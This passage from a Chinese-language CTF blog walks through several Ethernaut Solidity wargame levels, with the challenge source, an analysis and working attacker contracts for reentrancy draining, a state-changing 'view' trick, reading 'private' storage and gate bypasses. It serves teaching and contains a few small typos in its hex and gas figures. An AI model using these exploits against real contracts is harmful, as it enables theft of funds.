class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-9"><a href="#Analyse-9" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li><span id="inline-blue">DASP</span> 排第一的重入漏洞，也是著名的 <span id="inline-purple">DAO</span> 事件里用到的方法</li>
<li>漏洞主要在于 <code>withdraw()</code> 函数，合约在进行提币时，使用 <code>require</code> 依次判断提币账户是否拥有相应的资产，随后使用 <code>msg.sender.call.value(amount)</code> 来发送 <code>Ether</code> ，处理完成后相应修改用户资产数据</li>
<li>在提币的过程中，存在一个递归 <code>withdraw</code> 的问题（因为 <code>-=_amount</code> 在转账之后），攻击者可以部署一个包含恶意递归调用的合约将公共钱包合约里的 <code>Ether</code> 全部提出<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/9.png" alt></li>
<li>其中，转账使用的是 <code>address.call.value()()</code> 函数，传递了所有可用 <code>gas</code> 供调用，是可以成功执行递归的前提条件</li>
</ul>
<h2 id="Solution-9"><a href="#Solution-9" class="headerlink" title="Solution"></a>Solution</h2><ul>
<li>查看题目账户余额信息： <ul>
<li><span id="inline-blue">Reentrance</span> 合约余额为 <code>1 eth</code></li>
<li><code>balances[address(Attacker)] = 0</code></li>
</ul>
</li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/10.png" alt></p>
<ul>
<li>所以部署 <span id="inline-purple">Attacker</span> 合约时，可以给 <span id="inline-purple">Attacker</span> 合约先转 <code>1 eth</code> ，然后 <code>donate 1 eth</code> ，这样的话 <span id="inline-blue">Reentrance</span> 合约余额就是 <code>2 eth</code> 了，<code>balances[address(Attacker)]</code> 就是 <code>1 eth</code> ，然后每次 <code>withdraw 1 eth</code>，这样的话，重入 <code>2</code> 次就能将钱全部转出</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.19</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attacker&#123;</span><br><span class="line">    address instance_address = <span class="number">0x54426463ef0ff0c720e9947f79ab6a770fda34f4</span>;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line">    uint have_withdraw = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Attacker</span>(<span class="params"></span>) <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_balance</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> target.balanceOf(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_balance_ins</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_balance_my</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> address(<span class="keyword">this</span>).balance;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">        target.donate.value(<span class="number">1</span> ether)(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">payable</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (have_withdraw == <span class="number">0</span> &amp;&amp; msg.sender == instance_address)&#123;</span><br><span class="line">            have_withdraw = <span class="number">1</span>;</span><br><span class="line">            target.withdraw(<span class="number">1</span> ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">hack</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        target.withdraw(<span class="number">1</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>合约刚部署好余额如下<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/11.png" alt></li>
<li>调用 <span id="inline-purple">Attacker</span> 的 <code>donate()</code><br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/12.png" alt></li>
<li>调用 <code>hack()</code> 进行重入攻击 <code>2</code> 次，可以看到 <span id="inline-blue">Reentrance</span> 合约余额变为 <code>0</code> ，而 <code>balances[address(Attacker)] = 1 - 2</code> ，由于是 <code>uint256</code> 类型，所以下溢变成了 <code>uint256</code> 类型最大值，<span id="inline-green">攻击成功</span></li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/13.png" alt></p>
<p><br></p>
<h1 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h1><h2 id="Require-10"><a href="#Require-10" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>reach the top of your building</code></li>
</ul>
<h2 id="Source-10"><a href="#Source-10" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">view</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-10"><a href="#Analyse-10" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>通关条件是使 <code>contract.top = true</code></li>
<li><code>Building</code> 接口中声明了 <code>isLastFloor</code> 函数，用户可自行编写</li>
<li>在主合约中，先调用 <code>building.isLastFloor(floor)</code> 进行 <code>if</code> 判断，然后将 <code>building.isLastFloor(floor)</code> 赋值给 <code>top</code> 。要使 <code>top = ture</code> ，则 <code>building.isLastFloor(floor)</code> 第一次调用需返回 <code>false</code> ，第二次调用返回 <code>true</code></li>
<li>所以就有了思路：设置一个初始值为 <code>true</code> 的变量，每次调用 <code>isLastFloor()</code> 时，将其取反再返回</li>
<li>但是，题目在声明 <code>isLastFloor</code> 时，赋予了 <span id="inline-blue">view</span> 属性，<span id="inline-blue">view</span> 表示函数会读取合约变量，但是不会修改任何合约的状态</li>
<li>看了下题目的提示<p id="div-border-left-red">Sometimes solidity is not good at keeping promises.</p></li>
<li>翻阅了文档，找到对 <span id="inline-blue">view</span> 的描述：<p id="div-border-top-red"><strong>view functions: The compiler does not enforce yet that a view method is not modifying state.</strong></p></li>
<li>意思是当前 <code>Solidity</code> 编译器没有强制执行 <span id="inline-blue">view</span> 函数不能修改状态，所以上述做法就是可行的<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">view</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract hack &#123;</span><br><span class="line">    address instance_address = <span class="number">0x89fa2727ad30129f657994117323f7e15b3c626a</span>;</span><br><span class="line">    Elevator e = Elevator(instance_address);</span><br><span class="line">    bool public flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line">        flag = !flag;</span><br><span class="line">        <span class="keyword">return</span> flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) <span class="title">public</span></span>&#123;</span><br><span class="line">        e.goTo(<span class="number">123</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>调用 <code>exploit()</code> 即可<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/14.png" alt><br><br></p>
<h1 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h1><h2 id="Require-11"><a href="#Require-11" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>Unlock this contract to beat the level</code></li>
</ul>
<h2 id="Source-11"><a href="#Source-11" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public constant ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Privacy</span>(<span class="params">bytes32[<span class="number">3</span>] _data</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes16 _key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span></span><br><span class="line"><span class="comment">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span></span><br><span class="line"><span class="comment">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-11"><a href="#Analyse-11" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>之前 <code>Vault</code> 题目的升级版，还是一样，用 <code>getStorageAt()</code> 把链上的数据读出来</li>
</ul>
<h2 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">0</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="comment">// 0x000000000000000000000000000000000000000000000000000000df9dff0a01</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">1</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="comment">// 0x85b05e35e73af32ed1948f0a1a58d8a67e449f77eb22222decfef426f1936586</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">2</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="comment">// 0x9daa83d6f3dbb320583dc59ed67813a5adc473d0d2ff18c0be08ef1a46a037b0</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">3</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="comment">// 0xf001da34b0220001e65b894cb5ea3d0a3155843c51477b29215a6aa43348b697</span></span><br><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="number">4</span>, <span class="function"><span class="keyword">function</span>(<span class="params">x,y</span>)</span>&#123;<span class="built_in">console</span>.info(y);&#125;)</span><br><span class="line"><span class="comment">// 0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure>
<ul>
<li>可以看到，每一个存储位是 <code>32</code> 个字节。根据 <code>Solidity</code> 优化规则，当变量所占空间小于 <code>32</code> 字节时，会与后面的变量共享空间，如果加上后面的变量也不超过 <code>32</code> 字节的话，除去 <code>ID</code> 常量无需存储：<ul>
<li><code>bool public locked = true</code> 占 <code>1</code> 字节 -&gt; <code>01</code></li>
<li><code>uint8 private flattening = 10</code> 占 <code>1</code> 字节 -&gt; <code>0a</code></li>
<li><code>uint8 private denomination = 255</code> 占 <code>1</code> 字节 -&gt; <code>ff</code></li>
<li><code>uint16 private awkwardness = uint16(now)</code> 占 <code>2</code> 字节 -&gt; <code>df9d</code></li>
</ul>
</li>
<li>刚好对应了第一个存储位的 <code>df9dff0a0a</code></li>
<li>所以 <code>data[2]</code> 应该在第四个存储位 <code>0xf001da34b0220001e65b894cb5ea3d0a3155843c51477b29215a6aa43348b697</code><br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/15.png" alt><br><br></li>
</ul>
<h1 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h1><h2 id="Require-12"><a href="#Require-12" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>Make it past the gatekeeper and register as an entrant to pass this level.</code></li>
</ul>
<h2 id="Source-12"><a href="#Source-12" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'openzeppelin-solidity/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.gas.mod(<span class="number">8191</span>) == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analyse-12"><a href="#Analyse-12" class="headerlink" title="Analyse"></a>Analyse</h2><ul>
<li>满足三个 <code>modifier</code> 条件即可</li>
<li><code>gateOne</code> 很简单，通过第三方合约调用 <code>enter</code> 即可</li>
<li><code>gateTwo</code> 需要满足 <code>msg.gas % 8191 == 0</code><ul>
<li><code>msg.gas</code> 是 <code>remaining gas</code> ，在 <code>remix</code> 的 <code>Javascript VM</code> 环境下进行 <code>Debug</code>， 在 <code>Step detail</code> 可以看到这个变量，假设在进入 <code>enter</code> 之前的 <code>remaining gas = 81910</code></li>
</ul>
</li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/16.png" alt></p>
<ul>
<li>调试到 <code>gateTwo</code> 的 <code>msg.gas</code> 地方，此时 <code>remaining gas = 81697</code></li>
</ul>
<p><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/17.png" alt></p>
<ul>
<li><p>那么这个过程间消耗的 <code>gas = 81910 - 81697</code>，加上 <code>gas</code> 本身消耗的 <code>2</code> 即可，所以为了满足 <code>gateTwo</code>，在进入 <code>enter</code> 之前的 <code>gas</code> 可以设置为 <code>81910-91697+81910+2</code></p>
</li>
<li><p><code>gateThree</code> 也比较简单，最后的逻辑是将 <code>tx.origin</code> 倒数三四字节换成 <code>0000</code> 即可，可以通过 <code>bytes8(tx.origin) &amp; 0xFFFFFFFF0000FFFF</code> 实现</p>
</li>
</ul>
<h2 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"> </span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.gas % <span class="number">8191</span> == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">contract MyAgent &#123;</span><br><span class="line">    GatekeeperOne c;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">MyAgent</span>(<span class="params">address _c</span>) </span>&#123;</span><br><span class="line">        c = GatekeeperOne(_c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exploit</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        bytes8 _gateKey = bytes8(msg.sender) &amp; <span class="number">0xffffffff0000ffff</span>;</span><br><span class="line">        c.enter.gas(<span class="number">81910</span><span class="number">-81697</span>+<span class="number">81910</span>+<span class="number">2</span>)(_gateKey);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用 <code>exploit()</code> 即可<br><img src="https://blog-1252762426.cos.ap-beijing.myqcloud.com/blog/ethernaut/18.png" alt><br><br></p>
<h1 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h1><h2 id="Require-13"><a href="#Require-13" class="headerlink" title="Require"></a>Require</h2><ul>
<li><code>Register as an entrant to pass this level</code></li>
</ul>
<h2 id="Source-13"><a href="#Source-13" class="headerlink" title="Source"></a>Source</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span 